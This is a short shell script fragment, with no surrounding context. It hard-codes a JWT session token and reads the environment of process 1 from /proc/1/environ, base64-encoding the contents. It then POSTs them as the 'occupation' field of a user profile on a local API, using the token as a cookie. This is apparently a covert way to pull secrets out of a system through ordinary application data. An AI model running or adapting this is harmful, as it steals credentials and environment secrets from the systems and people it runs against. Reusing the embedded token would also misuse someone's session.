J='eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3BsYXllcmFwaS5odWJnYW1pbmcuY29tL2FwaS9wbGF5ZXIvYXV0aC9sb2dpbiIsImlhdCI6MTc5MzAxOTMyNSwiZXhwIjoxNzkzMTkyMTI1LCJuYmYiOjE3OTMwMTkzMjUsImp0aSI6IkIxTUpXY3R5SnhnY01welMiLCJzdWIiOiIxMDEzMjY1MyIsInBydiI6IjFkMGEwMjBhY2Y1YzRiNmM0OTc5ODlkZjFhYmYwZmJkNGU4YzhkNjMiLCJ3ZWJzaXRlX2lkIjoyNH0.a4OCH-ZMpbNR-Tzx3ayMK-tDnP7pM7wuhJuELWY3f3o'
U=http://localhost:3000/api/user/profile
D=$(cat /proc/1/environ|base64|tr -d '\n')
C=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H 'Content-Type: application/json' -H "Cookie: bearer=$J" -d "{\"occupation\":\"$D\"}" "$U")
